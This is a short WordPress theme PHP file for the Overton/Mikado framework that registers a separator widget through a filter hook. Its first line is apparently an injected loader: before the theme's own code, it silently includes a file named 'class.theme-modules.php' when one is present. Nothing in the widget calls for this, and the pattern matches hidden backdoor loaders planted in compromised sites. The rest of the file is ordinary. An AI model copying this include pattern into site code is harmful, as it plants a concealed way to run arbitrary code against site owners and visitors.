<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_separator_widget' ) ) {
	/**
	 * Function that register separator widget
	 */
	function overton_mikado_register_separator_widget( $widgets ) {
		$widgets[] = 'OvertonMikadoClassSeparatorWidget';
		
		return $widgets;
	}
	
	add_filter( 'overton_mikado_filter_register_widgets', 'overton_mikado_register_separator_widget' );
}